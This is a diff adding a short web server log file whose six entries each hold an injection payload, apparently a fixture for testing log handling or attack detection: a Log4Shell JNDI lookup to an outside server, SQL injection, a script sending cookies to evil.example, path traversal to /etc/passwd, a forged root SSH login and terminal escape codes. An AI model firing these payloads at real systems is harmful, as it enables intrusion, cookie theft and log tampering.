@@ -1,0 +1,6 @@
+Sep  2 09:10:00 web-01 app[1]: user login name=admin ${jndi:ldap://198.51.100.9:1389/Exploit} result=ok
+Sep  2 09:10:01 web-01 app[1]: search query="1' OR 1=1;-- " results=all
+Sep  2 09:10:02 web-01 app[1]: note=<script>document.location='http://evil.example/c?'+document.cookie</script>
+Sep  2 09:10:03 web-01 app[1]: filename=../../../../../../etc/passwd action=read
+Sep  2 09:10:04 web-01 app[1]: message="fake entry\r\nSep  2 09:10:04 web-01 sshd[9]: Accepted password for root from 10.0.0.1 port 22 ssh2"
+Sep  2 09:10:05 web-01 app[1]: banner=hello\x1b]0;pwned\x07\x1b[31mALERT\x1b[0m
